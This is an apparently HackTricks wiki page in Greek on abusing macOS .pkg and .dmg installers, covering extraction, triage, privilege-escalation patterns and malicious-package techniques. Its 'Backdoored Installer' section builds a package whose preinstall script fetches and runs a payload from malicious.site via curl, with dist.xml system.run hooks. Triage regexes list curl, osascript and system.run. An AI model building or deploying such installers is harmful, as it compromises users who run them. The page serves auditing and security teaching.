# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Βασικές Πληροφορίες

Ένα πακέτο εγκατάστασης macOS (**installer package**) (επίσης γνωστό ως αρχείο `.pkg`) είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS για να **διανέμει λογισμικό**. Αυτά τα αρχεία είναι σαν ένα **κουτί που περιέχει όλα όσα χρειάζεται ένα κομμάτι λογισμικού** για να εγκατασταθεί και να εκτελεστεί σωστά.

Το ίδιο το αρχείο package είναι ένα archive που περιέχει μια **ιεραρχία από αρχεία και directories που θα εγκατασταθούν στον στόχο** computer. Μπορεί επίσης να περιλαμβάνει **scripts** για να εκτελούν tasks πριν και μετά την εγκατάσταση, όπως το στήσιμο configuration files ή το καθάρισμα παλιών εκδόσεων του λογισμικού.

### Ιεραρχία

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Προσαρμογές (τίτλος, κείμενο καλωσορίσματος…) και έλεγχοι script/εγκατάστασης
- **PackageInfo (xml)**: Πληροφορίες, απαιτήσεις εγκατάστασης, τοποθεσία εγκατάστασης, paths προς scripts που θα εκτελεστούν
- **Bill of materials (bom)**: Λίστα αρχείων προς εγκατάσταση, ενημέρωση ή αφαίρεση με permissions αρχείων
- **Payload (CPIO archive gzip compressed)**: Αρχεία προς εγκατάσταση στο `install-location` από το PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre και post install scripts και περισσότεροι resources που εξάγονται σε έναν temp directory για εκτέλεση.

### Αποσυμπίεση
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Για να οπτικοποιήσεις τα περιεχόμενα του installer χωρίς να το αποσυμπιέσεις χειροκίνητα, μπορείς επίσης να χρησιμοποιήσεις το δωρεάν εργαλείο [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Αν ο στόχος είναι η ανάλυση, προσπάθησε να **αποφύγεις να ανοίξεις πρώτα το package με το `Installer.app`**. Κάποια packages μπορούν να εκτελέσουν code μόλις τα ανοίξει το Installer (για παράδειγμα μέσω `system.run()` ή installer plug-ins), οπότε η offline extraction είναι συνήθως το ασφαλέστερο σημείο εκκίνησης.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Βασικές Πληροφορίες

Τα αρχεία DMG, ή Apple Disk Images, είναι μια μορφή αρχείου που χρησιμοποιείται από το Apple's macOS για disk images. Ένα αρχείο DMG είναι ουσιαστικά ένα **mountable disk image** (περιέχει το δικό του filesystem) που περιέχει raw block data, συνήθως συμπιεσμένα και μερικές φορές κρυπτογραφημένα. Όταν ανοίγεις ένα αρχείο DMG, το macOS το **mounts ως να ήταν φυσικός δίσκος**, επιτρέποντάς σου να έχεις πρόσβαση στο περιεχόμενό του.

> [!CAUTION]
> Σημείωσε ότι τα **`.dmg`** installers υποστηρίζουν **τόσες πολλές μορφές** που στο παρελθόν μερικά από αυτά που περιείχαν vulnerabilities καταχράστηκαν για να επιτευχθεί **kernel code execution**.

### Ιεραρχία

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Η ιεραρχία ενός αρχείου DMG μπορεί να διαφέρει ανάλογα με το περιεχόμενο. Ωστόσο, για application DMGs, συνήθως ακολουθεί αυτή τη δομή:

- Top Level: Αυτό είναι το root του disk image. Συχνά περιέχει το application και πιθανώς ένα link προς τον φάκελο Applications.
- Application (.app): Αυτή είναι η πραγματική εφαρμογή. Στο macOS, μια εφαρμογή είναι συνήθως ένα package που περιέχει πολλά μεμονωμένα αρχεία και φακέλους που αποτελούν την εφαρμογή.
- Applications Link: Αυτό είναι ένα shortcut προς τον φάκελο Applications στο macOS. Ο σκοπός του είναι να σου διευκολύνει την εγκατάσταση της εφαρμογής. Μπορείς να σύρεις το αρχείο .app σε αυτό το shortcut για να εγκαταστήσεις την app.

## Privesc via pkg abuse

### Execution from public directories

Αν ένα pre ή post installation script εκτελείται για παράδειγμα από το **`/var/tmp/Installerutil`**, και ένας attacker μπορεί να ελέγξει αυτό το script, μπορεί να escalate privileges κάθε φορά που εκτελείται. Ή ένα παρόμοιο παράδειγμα:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Αυτή είναι μια [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) που αρκετοί installers και updaters θα καλέσουν για να **execute something as root**. Αυτή η function δέχεται ως παράμετρο το **path** του **file** που θα **execute**. Ωστόσο, αν ένας attacker μπορούσε να **modify** αυτό το file, θα μπορούσε να **abuse** την εκτέλεσή του με root για να **escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Για περισσότερες πληροφορίες δες αυτή την ομιλία: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Κατάχρηση περιβάλλοντος και shebang

Τα σύγχρονα bugs του PackageKit έδειξαν ότι τα installer scripts συχνά εκτελούνται ως **trusted root code** ενώ εξακολουθούν να διατηρούν κοντά τους attacker-controlled context. Όταν κάνεις auditing σε vendor packages, δώσε ιδιαίτερη προσοχή στα:

- Shell interpreters όπως `#!/bin/zsh` / `#!/bin/bash`
- Κλήσεις όπως `sudo -u $USER`, `launchctl asuser`, ή οποιαδήποτε λογική που εμπιστεύεται τα `$USER`, `$HOME`, `PATH`, `TMPDIR`, ή relative paths
- Non-shell interpreters που μπορεί να φορτώνουν user-controlled init files ή libraries
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Για το 2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs), δες [the generic macOS privesc page](../macos-privilege-escalation.md). Αν το package είναι **Apple-signed**, το ίδιο script bug μπορεί να γίνει **SIP/TCC-relevant** επειδή το `system_installd` μπορεί να μεταφέρει `com.apple.rootless.install.heritable`; δες [the SIP page](../macos-security-protections/macos-sip.md).

### Execution by mounting

Αν ένας installer γράφει στο `/tmp/fixedname/bla/bla`, είναι δυνατό να **δημιουργήσεις ένα mount** πάνω από το `/tmp/fixedname` με noowners ώστε να μπορέσεις να **τροποποιήσεις οποιοδήποτε αρχείο κατά τη διάρκεια της εγκατάστασης** για να abuse το installation process.

Ένα παράδειγμα αυτού είναι το **CVE-2021-26089** που κατάφερε να **overwrite ένα periodic script** για να αποκτήσει execution ως root. Για περισσότερες πληροφορίες δες την ομιλία: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

Είναι δυνατό να δημιουργήσεις απλώς ένα **`.pkg`** αρχείο με **pre and post-install scripts** χωρίς κανένα πραγματικό payload πέρα από το malware μέσα στα scripts.

### JS in Distribution xml

Είναι δυνατό να προσθέσεις **`<script>`** tags στο **distribution xml** αρχείο του package και αυτός ο κώδικας θα εκτελεστεί και μπορεί να **εκτελέσει commands** χρησιμοποιώντας **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Στα distribution packages αυτό συνήθως εξαρτάται από το αν το top-level `Distribution` αρχείο ενεργοποιεί external scripts, για παράδειγμα με `allow-external-scripts="true"`. Επομένως, η εξέταση μόνο των `preinstall` / `postinstall` δεν είναι αρκετή: το **Distribution XML** από μόνο του μπορεί να περιέχει `installation-check` / `volume-check` hooks και άμεσες διαδρομές εκτέλεσης `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Κακόβουλος installer που χρησιμοποιεί ένα script και JS code μέσα στο dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Αναφορές

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
